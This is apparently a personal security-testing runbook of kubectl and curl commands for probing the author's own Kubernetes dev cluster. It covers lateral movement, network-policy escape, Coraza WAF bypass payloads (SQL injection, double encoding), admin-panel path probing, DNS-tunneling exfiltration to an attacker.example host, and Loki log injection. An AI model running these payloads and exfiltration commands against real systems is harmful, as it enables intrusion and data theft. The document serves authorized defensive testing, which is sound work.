# Security Testing Commands

All commands target the dev cluster. Prefix with `KUBECONFIG=~/.kube/dev.yaml`.

---

## Phase 1: Network Policy Testing

### 1.1 Intra-Namespace Lateral Movement

```bash
kubectl run sectest --image=nicolaka/netshoot -n <target-ns> -- sleep 3600
kubectl exec -n <target-ns> sectest -- curl -s http://<other-pod-ip>:<any-port>
```

### 1.2 Cross-Namespace Escape

```bash
kubectl run sectest --image=nicolaka/netshoot -n <isolated-ns> -- sleep 3600
# Should be blocked:
kubectl exec -n <isolated-ns> sectest -- curl -s --connect-timeout 3 http://<pod-in-other-ns>:<port>
kubectl exec -n <isolated-ns> sectest -- curl -s --connect-timeout 3 https://httpbin.org/ip
# Always works (DNS baseline):
kubectl exec -n <isolated-ns> sectest -- nslookup exfil-test.attacker.example.com
```

### 1.3 Prometheus Label Impersonation

```bash
kubectl get ccnp baseline-prometheus-scrape -o yaml
kubectl run fake-prom --image=nicolaka/netshoot -n <test-ns> \
  --labels="app.kubernetes.io/name=prometheus" -- sleep 3600
kubectl exec -n <test-ns> fake-prom -- curl -s --connect-timeout 3 http://<target-pod>:<port>
```

### 1.4 Escape Hatch Abuse

```bash
# Check who can label namespaces
kubectl auth can-i update namespaces --as=system:serviceaccount:<ns>:<sa>
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.roleRef.name | test("admin|edit|cluster-admin")) | {name: .metadata.name, subjects: .subjects}'

# If a SA has permission, test the escape hatch
kubectl label namespace <test-ns> network-policy.homelab/enforcement=disabled
kubectl exec -n <test-ns> sectest -- curl -s --connect-timeout 3 http://<any-pod>:<any-port>

# CLEANUP: Re-enable immediately (alert fires at 5 minutes)
kubectl label namespace <test-ns> network-policy.homelab/enforcement-
```

### 1.5 Gateway Route Injection

```bash
cat <<'EOF' | kubectl apply -f -
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: sectest-route-injection
  namespace: <test-ns>
spec:
  parentRefs:
    - name: external
      namespace: istio-gateway
  hostnames:
    - "sectest.dev.tomnowak.work"
  rules:
    - backendRefs:
        - name: <internal-service>
          port: <port>
EOF
curl -k --resolve "sectest.dev.tomnowak.work:443:<external-ip>" https://sectest.dev.tomnowak.work/
# CLEANUP
kubectl delete httproute sectest-route-injection -n <test-ns>
```

---

## Phase 2: Authentication & WAF Testing

### 2.1 Coraza WAF Bypass

```bash
EXTERNAL_IP=$(kubectl get svc -n istio-gateway external -o jsonpath='{.status.loadBalancer.ingress[0].ip}')

# Basic SQL injection (should be blocked at PL1)
curl -k --resolve "vault.dev.tomnowak.work:443:${EXTERNAL_IP}" \
  "https://vault.dev.tomnowak.work/?id=1'+OR+1=1--"

# Double-encoding bypass
curl -k --resolve "vault.dev.tomnowak.work:443:${EXTERNAL_IP}" \
  "https://vault.dev.tomnowak.work/?id=1%2527+OR+1%253D1--"

# JSON body (PL1 has limited JSON inspection)
curl -k --resolve "vault.dev.tomnowak.work:443:${EXTERNAL_IP}" \
  -H "Content-Type: application/json" \
  -d '{"search":"1\u0027 OR 1=1--"}' \
  "https://vault.dev.tomnowak.work/api/test"
```

### 2.2 WAF FAIL_OPEN Verification

```bash
kubectl exec -n monitoring prometheus-kube-prometheus-stack-0 -c prometheus -- \
  wget -qO- 'http://localhost:9090/api/v1/query?query=coraza_waf_requests_total' | jq '.data.result | length'
# If length is 0, WAF may be in fail-open state — verify with a known-bad request
```

### 2.3 Vaultwarden Admin Panel Access

```bash
# Direct pod access bypasses gateway entirely
kubectl exec -n <test-ns> sectest -- curl -s -I http://<vw-pod-ip>:8080/admin

# Path variations against the gateway
for path in /admin/ /Admin /ADMIN //admin /admin?x=1; do
  curl -k --resolve "vault.dev.tomnowak.work:443:${EXTERNAL_IP}" -I "https://vault.dev.tomnowak.work${path}"
done
```

### 2.4 OAuth2-Proxy Cookie Analysis

```bash
curl -k --resolve "prometheus.internal.dev.tomnowak.work:443:<internal-ip>" \
  -c - "https://prometheus.internal.dev.tomnowak.work/" 2>/dev/null | grep oauth2
# Check: domain, path, secure, httponly, samesite, 7-day expiry
```

---

## Phase 3: Privilege Escalation

### 3.1 Service Account Token Enumeration

```bash
# List pods with automounted tokens
kubectl get pods -A -o json | \
  jq '.items[] | select(.spec.automountServiceAccountToken != false) | {ns: .metadata.namespace, pod: .metadata.name, sa: .spec.serviceAccountName}'

# Particularly interesting: homepage SA has cluster-wide read
kubectl auth can-i --list --as=system:serviceaccount:homepage:homepage
```

### 3.2 Container Security Audit

```bash
# Containers running as root
kubectl get pods -A -o json | \
  jq '.items[] | .spec.containers[] | select(.securityContext.runAsUser == 0 or .securityContext.runAsNonRoot == false) | {pod: .name, user: .securityContext.runAsUser}'

# Elevated capabilities
kubectl get pods -A -o json | \
  jq '.items[] | .spec.containers[] | select(.securityContext.capabilities.add != null) | {pod: .name, caps: .securityContext.capabilities.add}'

# Pods opted out of Istio mesh (no mTLS)
kubectl get pods -A -o json | \
  jq '.items[] | select(.metadata.annotations["istio.io/dataplane-mode"] == "none") | {ns: .metadata.namespace, pod: .metadata.name}'
```

### 3.3 Crown Jewel: AWS IAM Key

```bash
kubectl auth can-i get secrets -n kube-system --as=system:serviceaccount:<ns>:<sa>
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.subjects[]?.name | test("external-secrets")) | {name: .metadata.name, role: .roleRef.name}'
```

### 3.4 Garage S3 Admin API from Gateway

```bash
kubectl exec -n istio-gateway <gateway-pod> -- \
  curl -s --connect-timeout 3 http://garage.garage.svc.cluster.local:3903/v1/status
```

---

## Phase 4: Data Exfiltration Paths

### 4.1 DNS Tunneling

```bash
# Works even from isolated namespaces
kubectl exec -n <isolated-ns> sectest -- \
  nslookup $(echo "sensitive-data" | base64).exfil.example.com
```

### 4.2 Prometheus as Intelligence Source

```bash
# Service topology
kubectl exec -n monitoring prometheus-kube-prometheus-stack-0 -c prometheus -- \
  wget -qO- 'http://localhost:9090/api/v1/query?query=istio_requests_total' | jq '.data.result[] | {src: .metric.source_workload, dst: .metric.destination_workload}'

# Node inventory with IPs
kubectl exec -n monitoring prometheus-kube-prometheus-stack-0 -c prometheus -- \
  wget -qO- 'http://localhost:9090/api/v1/query?query=kube_node_info' | jq '.data.result[] | .metric'
```

### 4.3 Log Injection via Loki

```bash
# Test if Loki is reachable
kubectl exec -n <any-ns> sectest -- \
  curl -s --connect-timeout 3 http://loki-headless.monitoring.svc.cluster.local:3100/ready

# If reachable, inject a crafted log entry
kubectl exec -n <any-ns> sectest -- \
  curl -s -X POST http://loki-headless.monitoring.svc.cluster.local:3100/loki/api/v1/push \
  -H "Content-Type: application/json" \
  -d '{"streams":[{"stream":{"job":"injected","namespace":"security-test"},"values":[["'$(date +%s)000000000'","SECURITY TEST: Log injection successful"]]}]}'
```

---

## Phase 5: Supply Chain

### 5.1 Flux Source Manipulation

```bash
flux get sources all
kubectl get secret -n flux-system -o json | \
  jq '.items[] | select(.metadata.name | test("github|flux")) | .metadata.name'
kubectl get receivers -n flux-system
```

### 5.2 PXE Boot Attack Surface

```bash
kubectl exec -n <any-ns> sectest -- \
  curl -s --connect-timeout 3 http://pxe-boot.pxe-boot.svc.cluster.local/boot.ipxe
```
